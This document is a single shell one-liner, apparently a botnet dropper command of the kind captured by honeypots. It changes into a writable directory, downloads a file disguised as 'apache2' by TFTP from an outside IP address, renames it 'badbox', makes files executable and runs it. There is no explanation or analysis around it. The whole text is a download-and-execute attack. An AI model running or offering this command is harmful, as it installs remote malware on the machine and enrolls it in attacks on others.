cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp 185.165.29.29 -c get apache2;cat apache2 >badbox;chmod +x *;./badbox
